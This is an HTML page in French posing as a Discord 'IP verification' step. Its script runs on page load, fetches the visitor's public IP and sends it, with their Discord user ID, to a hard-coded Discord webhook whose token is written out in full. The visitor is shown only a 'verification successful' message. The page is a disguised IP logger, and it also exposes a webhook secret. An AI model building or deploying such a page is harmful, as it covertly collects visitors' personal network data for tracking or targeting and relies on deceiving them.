<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Vérification d'IP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
        }
        #container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h1 {
            font-size: 20px;
            color: #333;
        }
        #result {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Extraire l'identifiant utilisateur de l'URL
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('user_id');

            if (userId) {
                // Récupérer l'IP de l'utilisateur
                fetch("https://api.ipify.org?format=json")
                    .then(response => response.json())
                    .then(data => {
                        const userIP = data.ip;

                        // Envoi de l'IP et de l'identifiant utilisateur au webhook Discord
                        fetch("https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                content: `Vérification réussie pour l'utilisateur <@${userId}>. IP : ${userIP}`
                            })
                        })
                        .then(() => {
                            document.body.innerHTML = "<h2>Vérification réussie ! Vous pouvez retourner sur Discord.</h2>";
                        })
                        .catch(error => {
                            console.error("Erreur lors de l'envoi de l'IP:", error);
                            document.body.innerHTML = "<h2>Erreur lors de la vérification.</h2>";
                        });
                    })
                    .catch(error => {
                        console.error("Erreur lors de la récupération de l'IP:", error);
                        document.body.innerHTML = "<h2>Erreur lors de la récupération de votre IP.</h2>";
                    });
            } else {
                document.body.innerHTML = "<h2>Erreur : utilisateur non identifié.</h2>";
            }
        });
    </script>
</head>
<body>
    <h1>Vérification en cours...</h1>
</body>
</html>
